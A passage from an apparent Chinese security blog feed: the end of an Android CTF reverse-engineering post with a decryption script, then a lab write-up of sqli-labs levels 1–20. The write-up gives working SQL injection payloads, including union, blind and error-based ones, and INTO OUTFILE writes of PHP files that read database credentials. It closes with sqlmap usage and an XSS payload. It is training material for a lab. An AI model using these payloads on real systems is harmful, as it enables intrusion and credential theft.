class="number">2</span>].n128_u8[<span class="number">1</span>] = v12;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>] = v13;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>] = v14;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>] = v15;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>] = v16;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>] = v17;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>] = v19;</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>] = v21;</span><br><span class="line">  *inputs = v18;</span><br><span class="line">  inputs[<span class="number">1</span>] = v20;</span><br><span class="line">  retStr[<span class="number">0</span>] = <span class="number">26</span>;</span><br><span class="line">  ind2 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  retStr1 = &amp;retStr[<span class="number">1</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;retStr[<span class="number">1</span>], <span class="string">&quot;Wrong, wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( inputs-&gt;n128_u8[ind2] == cipher[ind2] )<span class="comment">//比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)++ind2 &gt; <span class="number">41</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::assign((<span class="keyword">int</span>)retStr, <span class="string">&quot;Hello, hello!&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( (retStr[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        retStr1 = v27;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v24 = (*env)-&gt;NewStringUTF(env, retStr1);</span><br><span class="line">  <span class="keyword">if</span> ( (retStr[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v27)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> v24;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sign = <span class="string">&quot;308202e4308201cc020101300d06092a864886f70d010105050030373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b30090603550406130255533020170d3231303330363134333034385a180f32303531303232373134333034385a30373116301406035504030c0d416e64726f69642044656275673110300e060355040a0c07416e64726f6964310b300906035504061302555330820122300d06092a864886f70d01010105000382010f003082010a0282010100cbf2b09e4308ebb459e8841e5a7b920497fef2b349e80648f7eb35f48d40a75e7ce7945b8b42d197bec0bf177e6c9899ed707dcc4a726cb14c1a69b0c4a02474806fa73cfb10e10f7b1665021c24762b6edad65ca63cea3c72e0d4e4ca3f98301173eec3254337af1f5a11f779ecbe04d1b74d53f5835e011222155a56f97e00d75374cd93080dfa087cd356a99fe1eebf5d6d5e31846aad5252c3a17a4656e2e210ce1c7aa4d147fb8cf440a50add61bbb2ec299a2e0dab0b4504796ac3a899da553ab1d83576691ab23409d18398014b3b5eaf12e83f4d99aa09e1e4e4cae133530730c1133da2b3dee37b58eb1a5795b221ec5a8830731a41167d295f9e1b0203010001300d06092a864886f70d010105050003820101000e4740235e9cf2be33de3e06d777139cbbc5cf0622285c17da04697b8067318aaf8df0fbb4d3166f293ea15aa2592f06eb6929af063722ac9f30ad85e2c087564931d6ac65fcd5fbc864b3dc9841e039c6e1d5fbc5c2f8adf90a547bc4ebc07d387914db24451c2cc89925359bd3bb0750c7aabf9d743b1893e98bbc8ff74b24fc0b4be2dbaaf1c917bba01496d0617ffc3a4a8b7a6e79a3036298a6ebf57bb00001e43a0b242864eebb0fcec9e323144d4447c878430f18e6e358ad97566fa04d1f07b171c1476c9af5a1eba0bf6616e219c0b9e1299d09fecded24a880397f92e0f99d8951228c7770c184fd77adff943bfc8b6aa524c5f0a6d7686fe35486&quot;</span></span><br><span class="line">cipher = [<span class="number">0xca</span>, <span class="number">0xeb</span>, <span class="number">0x4a</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0xe1</span>, <span class="number">0xa1</span>, <span class="number">0xeb</span>, <span class="number">0xe1</span>, <span class="number">0xee</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0xa2</span>, <span class="number">0x6d</span>, <span class="number">0x49</span>, <span class="number">0xc8</span>, <span class="number">0x8e</span>, <span class="number">0xe</span>, <span class="number">0xcc</span>, <span class="number">0xe9</span>, <span class="number">0x45</span>, <span class="number">0xcf</span>, <span class="number">0x23</span>, <span class="number">0xcc</span>, <span class="number">0xc5</span>, <span class="number">0x4c</span>, <span class="number">0xc</span>, <span class="number">0x85</span>, <span class="number">0xcf</span>, <span class="number">0xa9</span>, <span class="number">0x8c</span>, <span class="number">0xf6</span>, <span class="number">0xe6</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0x6d</span>, <span class="number">0xac</span>, <span class="number">0xc</span>, <span class="number">0xac</span>, <span class="number">0x77</span>, <span class="number">0xe0</span>, <span class="number">0x64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># shift byte</span></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    x = ((cipher[ind] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x7f</span>) | ((cipher[ind] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x7f</span>)</span><br><span class="line">    cipher[ind] = x</span><br><span class="line"></span><br><span class="line">ind = <span class="number">354</span></span><br><span class="line"><span class="keyword">for</span> ind1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>( (cipher[ind1] ^ (<span class="built_in">ord</span>(sign[ind]) + ind1 )) &amp; <span class="number">0x7f</span> ), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ind = ind + <span class="number">27</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录最近做的一些Android逆向题目。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQL,XSS,文件上传实验记录</title>
    <link href="http://slient2009.github.io/2021/11/22/Web-Labs/"/>
    <id>http://slient2009.github.io/2021/11/22/Web-Labs/</id>
    <published>2021-11-22T05:00:00.000Z</published>
    <updated>2021-12-10T17:44:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>很久之前的实训课程实验记录，权当凑数。</p><span id="more"></span><h2 id="SQL-Lab"><a href="#SQL-Lab" class="headerlink" title="SQL-Lab"></a>SQL-Lab</h2><h3 id="数据库结构"><a href="#数据库结构" class="headerlink" title="数据库结构"></a>数据库结构</h3><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185241263.png" alt="image-20201126185241263"></p><p><strong>information_schema</strong></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185203312.png" alt="image-20201126185203312"></p><p><strong>security</strong></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126185303420.png" alt="image-20201126185303420"></p><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><h4 id="检查是否存在注入点"><a href="#检查是否存在注入点" class="headerlink" title="检查是否存在注入点"></a>检查是否存在注入点</h4><p>一般直接加引号<code>&#39;</code>，也可以考虑宽字符闭合引号。<br>这里一试就报错发现有注入点。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221315153.png" alt="image-20200714221315153"></p><h4 id="检查关键字过滤"><a href="#检查关键字过滤" class="headerlink" title="检查关键字过滤"></a>检查关键字过滤</h4><p>一般来说会过滤一些关键字，诸如select、union、where等。<br>如果有过滤就要使用一些绕过手段，比如双写绕过、注释绕过等，本次课程还未涉及所以不讨论。<br>事实上还有关于注释符的过滤，绕过方法也有很多。（如果过滤规则不是很严的话）</p><h4 id="判断回显"><a href="#判断回显" class="headerlink" title="判断回显"></a>判断回显</h4><p>确定sql查询语句有多少回显位，一般使用order by 语句二分确定回显位。<br>这里可以确定有4个回显位。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221822503.png" alt="image-20200714221822503"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714221834365.png" alt="image-20200714221834365"></p><h4 id="查出相关参数"><a href="#查出相关参数" class="headerlink" title="查出相关参数"></a>查出相关参数</h4><p>一般不急着查information_schema那几张表，先看看database() user()之类的函数结果。<br>这里先看到数据库名和用户名。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222222788.png" alt="image-20200714222222788"></p><h4 id="查information-schema"><a href="#查information-schema" class="headerlink" title="查information_schema"></a>查information_schema</h4><p>先要明确information_schema里面有什么内容</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714222415460.png" alt="image-20200714222415460"></p><h4 id="根据得到的数据库名查表和列"><a href="#根据得到的数据库名查表和列" class="headerlink" title="根据得到的数据库名查表和列"></a>根据得到的数据库名查表和列</h4><p><code>id=-1&#39; union select 1,group_concat(schema_name),2 from information_schema.schemata where &#39;1&#39;=&#39;1</code><br>直接出所有数据库名<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223437960.png" alt="image-20200714223437960"></p><h4 id="拿到security下的所有表"><a href="#拿到security下的所有表" class="headerlink" title="拿到security下的所有表"></a>拿到security下的所有表</h4><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223722924.png" alt="image-20200714223722924"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714223712801.png" alt="image-20200714223712801"></p><h4 id="继续查表"><a href="#继续查表" class="headerlink" title="继续查表"></a>继续查表</h4><p>大概对users表感兴趣，那就看看users下面都有哪些字段，然后顺手读出来。<br><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224157880.png" alt="image-20200714224157880"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714224319439.png" alt="image-20200714224319439"></p><p>于是第一关完成</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-2/?id=2111111%20union%20select%20user(),group_concat(password),group_concat(username)%20from%20users%20order%20by%203</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126190149545.png" alt="image-20201126190149545"></p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>闭合<code>(&#39;</code>,然后用–+注释之后的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-3/?id=-111%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126193130954.png" alt="image-20201126193130954"></p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>闭合<code>(&quot;</code>,然后用–+注释之后的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-4/?id=-9%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20users--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126201348544.png" alt="image-20201126201348544"></p><h3 id="Less-5-布尔注入"><a href="#Less-5-布尔注入" class="headerlink" title="Less-5 布尔注入"></a>Less-5 布尔注入</h3><p>首先要还是要确定注入类型，如字符型、数字型，然后构造条件。</p><p>这里用left函数取单个字符来确定整个字符串的取值，由二分可知database()的第一个字符为’s’。</p><p>先通过简单的测试得知这里有注入点，而且因为只有两种回显状态，所以应该是bool注入。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094329018.png" alt="image-20201128094329018"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094347246.png" alt="image-20201128094347246"></p><p>以上的<code>1=2</code>和<code>1=1</code>的语句是被执行了的，下面将其替换为其他语句猜解关键信息。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204229902.png" alt="image-20201126204229902"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126204246514.png" alt="image-20201126204246514"></p><p>更详细一点儿，还可以通过length函数先确定一下database()的长度。</p><p>除了上述的带boolean回显的二分盲注，还可以通过使用sleep()的时间盲注，或者基于笛卡尔积的时间盲注。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128094740436.png" alt="image-20201128094740436"></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>类似于Less-5,只是换成了双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.133/sqli-labs/Less-6/?id=-1%22%20or%20left(database(),1)=%27s%27--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126205514505.png" alt="image-20201126205514505"></p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>记得打开<code>secure-file-priv=&quot;&quot;</code></p><p>由提示,需要用到外部文件,先利用less-1搞清楚工作目录</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126220832111.png" alt="image-20201126220832111"></p><p>然后利用MySQL文件操作在目录下面写一个php一句话木马<br>目录指定为<code>D:\phpStudy\sqli-labs\horse1.php</code><br>为了获取Less-7的源码,木马内容先写成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\Less-7\index.php&quot;</span>; <span class="comment">#也可能是index.html,这里是试出来的,且注意转义</span></span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\index.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse1.php%22%20--+</span><br></pre></td></tr></table></figure><p>虽然页面上还是返回Error,但是实际上是写入成功的,接下来访问horse1.php<br>这里相当于用一个php 输出了另外一个html+php文件的内容,所以浏览器会自动解析,文件的具体内容在开发者工具里面查看</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222034823.png" alt="image-20201126222034823"></p><p>可以看到Less-7 index.php的源代码,包括Sql语句的拼接方式,这里解释了为什么要闭合双括号.<br>同时,可以看到php包含了sql-connect.php来连接数据库,于是再用类似的方法查看sql-connect.php的源代码</p><p>向目录下写入木马horse2.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$f=&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php&quot;;</span><br><span class="line">$h=fopen($f,&quot;r&quot;);</span><br><span class="line">$c=fread($h,filesize($f));</span><br><span class="line">echo $c;</span><br><span class="line">fclose($h);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- payload --&gt;</span></span><br><span class="line">http://192.168.218.133/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure><p>访问horse2.php</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201126222837646.png" alt="image-20201126222837646"></p><p>发现sql-connect.php又包含了一个db-creds.inc配置文件来连接数据库,于是故技重施,去查看这个文件的源代码</p><p>向目录下写入木马horse3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="string">&quot;D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\db-creds.inc&quot;</span>;</span><br><span class="line"><span class="variable">$h</span>=fopen(<span class="variable">$f</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=fread(<span class="variable">$h</span>,filesize(<span class="variable">$f</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">fclose(<span class="variable">$h</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload --&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20$f=%22D:\\phpStudy\\WWW\\sqli-labs\\sql-connections\\sql-connect.php%22;%20$h=fopen($f,%22r%22);%20$c=fread($h,filesize($f));%20echo%20$c;%20fclose($h);?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\horse2.php%22%20--+</span><br></pre></td></tr></table></figure><p>访问horse3.php，可以看到数据库的用户名和密码。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127103843514.png" alt="image-20201127103843514"></p><p>进一步的，我们可以通过向目录下写入木马horse4.php去查询数据库中的所有信息，因为已经获取的用户名和密码，所以这个过程是容易实现的。更容易的实现方法是直接仿照index.php的代码，包含文件<code>..\sql-connections\sql-connect.php</code>即可获得数据库访问权限，然后写代码查询即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;..\\sql-connections\\sql-connect.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select group_concat(username),group_concat(password) from users&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$row</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! payload--&gt;</span><br><span class="line">http://192.168.218.139/sqli-labs/Less-7/?id=--1%27))%20union%20select%20%22%20%22,%22%20%22,%27%3C?php%20include(%22..\\sql-connections\\sql-connect.php%22);%20$sql=%22select%20group_concat(username),group_concat(password)%20from%20users%22;%20$res%20=%20mysql_query($sql);%20$row%20=%20mysql_fetch_array($res);%20echo%20json_encode($row);%20?%3E%27%20into%20outfile%20%22D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\horse4.php%22%20--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110111890.png" alt="image-20201127110111890"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>闭合单引号，然后是bool盲注</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110313357.png" alt="image-20201127110313357"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127110922998.png" alt="image-20201127110922998"></p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>基于时间的bool盲注</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure><p>在if的条件语句里面写一些二分语句即可基于时间猜出数据库内容。</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>类似于Less-9，只是换成了双引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.218.139/sqli-labs/Less-9/?id=-1%27%20union%20select%201,(if(%20database()=%27security%27,%20sleep(2),2)),3--+</span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>基于报错的注入方法</p><p>POST payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+;&amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163052801.png" alt="image-20201127163052801"></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>类似于Less-11，只是需要闭合<code>(&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&quot;) and (extractvalue(1,concat(0x7e,(select group_concat(username) from users ),0x7e)))--+&amp;passwd=dasdfasd&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127163743773.png" alt="image-20201127163743773"></p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>为什么又是报错注入，只是换了闭合符号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;--! POST payload --&gt;</span><br><span class="line">uname=admin&#x27;) and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e))-- + &amp;passwd=admian&amp;submit=Submit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174352569.png" alt="image-20201127174352569"></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>同上，闭合双引号</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127174606873.png" alt="image-20201127174606873"></p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>二分盲注，闭合单引号，下图说明admin用户的密码的首字母为’a’。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127175332286.png" alt="image-20201127175332286"></p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>闭合<code>(&quot;</code>的时间盲注</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127181919126.png" alt="image-20201127181919126"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>有意思的一个题，因为这里用到了两个参数。</p><p>通过审计源代码，可以看到这里的查询语句稍微有点儿安全意识，不仅对uname进行了严格的过滤，还考虑了先通过uname检查数据库中是否包含了对应用户的数据，然后再去修改用户。<br>但是为什么不对password也过滤一次呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127202028435.png" alt="image-20201127202028435"></p><p>由提示，使用报错注入。<br>但是这里有一个问题，我们如何知道数据库中有哪些用户名呢？这关系到我们是否能够通过第一次SQL查询从而进入内部的if语句中。当然，可以考虑常见的用户名如admin、root、administration等等，但是如果恰好没有这些用户名呢？</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127200552580.png" alt="image-20201127200552580"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>审计源码，可以看到php还捕获了IP和uagent两个参数，其中uagent可以被控制且未被过滤。<br>根据关口名称提示，利用uagent完成报错注入</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204937987.png" alt="image-20201127204937987"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127204824111.png" alt="image-20201127204824111"></p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>同上，只是注入点换成了referer</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127205230525.png" alt="image-20201127205230525"></p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>审计源码，注意判断条件。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213608048.png" alt="image-20201127213608048"></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201127213523251.png" alt="image-20201127213523251"></p><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>sqlmap基本上是一梭子的事儿，因为sqlmap足够强大，一般的注入点都能打下来，要是sqlmap都没办法，那么人力也很难了。<br>当然，这里可能会有参数处理(base64)使得sqlmap不能直接使用，那么就需要写代码配合sqlmap了。</p><p>抬手就开始</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233829160.png" alt="image-20200714233829160"></p><p>然后就出了</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20200714233955698.png" alt="image-20200714233955698"></p><p>接下来就只需要按图索骥，从数据库名查表名、列名和字段值了。注意-T -D设定table和database来限定范围。</p><p>一下介绍一些扩展用法</p><blockquote><p> sqlmap -r xxx.txt -p 自动测试抓到的包内的一个post参数</p><p> sqlmap -u 自动测试一个存在注入的url（一般后台比较好用，可以-p指定包中的某个post参数）</p><p> sqlmap -u -data 测试url中get的注入</p><p> sqlmap -u -data –dbs –level2 在level2中，会引入自动化的cookie注入</p><p> 设置temper参数来选定测试的级别</p></blockquote><h2 id="XSS-Lab"><a href="#XSS-Lab" class="headerlink" title="XSS-Lab"></a>XSS-Lab</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>首先审查元素，明确输入的payload在页面中的位置。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111226621.png" alt="image-20201128111226621"></p><p>显然，这里需要闭合<code>&lt;h2&gt;</code>标签，然后跟上js代码。</p><p>因为是第一关，没有特别的过滤，直接闭合就好了。</p><p><code>http://192.168.68.219/xss/level1.php?name=test&lt;/h2&gt;&lt;script&gt;alert(&#39;xxs&#39;);&lt;/script&gt;</code></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20201128111106471.png" alt="image-20201128111106471"></p><h3 id="level2"><a href="#level2" class="headerlink" 